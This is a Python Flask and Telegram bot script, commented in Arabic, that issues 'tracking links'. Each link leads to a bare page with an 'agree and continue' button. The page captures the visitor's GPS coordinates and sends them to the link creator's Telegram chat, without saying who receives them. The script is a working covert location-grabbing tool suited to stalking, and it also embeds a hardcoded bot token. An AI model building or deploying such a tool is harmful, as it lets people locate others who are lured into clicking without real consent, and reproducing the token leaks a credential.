"""
بوت تتبع المواقع - Telegram Location Tracking Bot
نسخة مبسطة تعمل 100%
البوت: @cccc00bot
"""

from flask import Flask, request, jsonify
import telebot
import threading
import logging
import os
import secrets
import time
from datetime import datetime, timedelta

# ========== إعدادات ==========
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

BOT_TOKEN = os.environ.get('BOT_TOKEN', '7628474532:AAHQMH9nJHYqB25X89kQYtE8Ms3x5e6m7TY')
bot = telebot.TeleBot(BOT_TOKEN, parse_mode='Markdown')

tracking_links = {}

# ========== صفحات الويب ==========
@app.route('/')
def home():
    return '''
    <!DOCTYPE html>
    <html dir="rtl">
    <head><meta charset="UTF-8"><title>📍 بوت التتبع</title></head>
    <body style="text-align:center;padding:50px;">
        <h1>📍 بوت تتبع المواقع</h1>
        <p>✅ الخدمة تعمل</p>
        <p>🤖 البوت: @cccc00bot</p>
        <a href="/health">فحص الصحة</a>
    </body>
    </html>
    '''

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'bot': '@cccc00bot',
        'time': datetime.now().isoformat()
    })

# ========== معالجات البوت ==========
@bot.message_handler(commands=['start', 'help'])
def start(message):
    """معالجة أمر /start"""
    try:
        logger.info(f"📩 استقبل /start من: {message.from_user.username}")
        bot.reply_to(
            message,
            '''🎯 *مرحباً!*

📍 **بوت تتبع المواقع الآمن**

🤖 **البوت:** @cccc00bot
🆔 **معرفك:** `''' + str(message.from_user.id) + '''`

🚀 **للبدء:** أرسل `/newlink`
        ''',
            parse_mode='Markdown'
        )
        logger.info(f"✅ تم الرد على {message.from_user.username}")
    except Exception as e:
        logger.error(f"❌ خطأ في /start: {e}")

@bot.message_handler(commands=['newlink'])
def newlink(message):
    """إنشاء رابط تتبع جديد"""
    try:
        tracking_id = secrets.token_urlsafe(12)
        tracking_links[tracking_id] = {
            'chat_id': message.chat.id,
            'created': datetime.now(),
            'active': True
        }
        
        url = f'https://telegram-tracking-bot-nkgz.onrender.com/track/{tracking_id}'
        
        bot.reply_to(
            message,
            f'''✅ *رابط تتبع جديد!*

🔗 **الرابط:**
{url}

🆔 **الكود:** `{tracking_id}`
⏰ **ينتهي بعد:** 24 ساعة

📱 **افتح الرابط على جهاز آخر للإرسال**
            ''',
            parse_mode='Markdown'
        )
        logger.info(f"📝 تم إنشاء رابط: {tracking_id}")
    except Exception as e:
        logger.error(f"❌ خطأ في newlink: {e}")

@app.route('/track/<tracking_id>')
def track_page(tracking_id):
    if tracking_id in tracking_links:
        return '''
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
            <meta charset="UTF-8">
            <title>طلب الموقع</title>
            <style>
                body { font-family: Arial; text-align: center; padding: 50px; }
                .btn { background: #28a745; color: white; padding: 15px 30px; 
                       border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
            </style>
        </head>
        <body>
            <h1>📍 طلب الوصول إلى الموقع</h1>
            <button class="btn" onclick="getLocation()">✅ موافق ومتابعة</button>
            <script>
                function getLocation() {
                    if (navigator.geolocation) {
                        navigator.geolocation.getCurrentPosition(
                            function(position) {
                                const data = {
                                    latitude: position.coords.latitude,
                                    longitude: position.coords.longitude,
                                    accuracy: position.coords.accuracy,
                                    timestamp: new Date().toISOString(),
                                    tracking_id: "''' + tracking_id + '''"
                                };
                                
                                fetch('/track', {
                                    method: 'POST',
                                    headers: {'Content-Type': 'application/json'},
                                    body: JSON.stringify(data)
                                }).then(() => {
                                    document.body.innerHTML = "<h1>✅ تم الإرسال بنجاح</h1>";
                                });
                            },
                            function(error) {
                                alert("فشل: " + error.message);
                            }
                        );
                    } else {
                        alert("المتصفح لا يدعم الموقع");
                    }
                }
            </script>
        </body>
        </html>
        '''
    return "رابط غير صالح", 404

@app.route('/track', methods=['POST'])
def handle_track():
    try:
        data = request.get_json()
        tracking_id = data.get('tracking_id')
        
        if tracking_id in tracking_links:
            chat_id = tracking_links[tracking_id]['chat_id']
            lat = data.get('latitude')
            lon = data.get('longitude')
            
            bot.send_message(
                chat_id,
                f'''📍 *موقع جديد!*

🆔 **الكود:** `{tracking_id}`
📍 **الإحداثيات:** `{lat}`, `{lon}`
🗺️ **الخريطة:** https://maps.google.com/?q={lat},{lon}
🕒 **الوقت:** {datetime.now().strftime("%Y/%m/%d %I:%M %p")}
                ''',
                parse_mode='Markdown'
            )
            
            return jsonify({'success': True})
            
        return jsonify({'error': 'رابط غير صالح'}), 400
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ========== تشغيل البوت ==========
def run_bot():
    """تشغيل البوت"""
    logger.info("🚀 بدء تشغيل البوت...")
    
    while True:
        try:
            # اختبار الاتصال
            bot_info = bot.get_me()
            logger.info(f"✅ البوت متصل: @{bot_info.username}")
            
            # بدء Polling
            logger.info("🎯 بدء استقبال الرسائل...")
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
            
        except Exception as e:
            logger.error(f"❌ خطأ: {e}")
            logger.info("⏳ إعادة المحاولة بعد 10 ثواني...")
            time.sleep(10)

# ========== بدء التشغيل ==========
if __name__ == '__main__':
    # بدء البوت في خيط منفصل
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    bot_thread.start()
    logger.info("✅ بدأ خيط البوت")
    
    # تشغيل خادم Flask
    port = int(os.environ.get('PORT', 10000))
    logger.info(f"🌐 بدء الخادم على port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)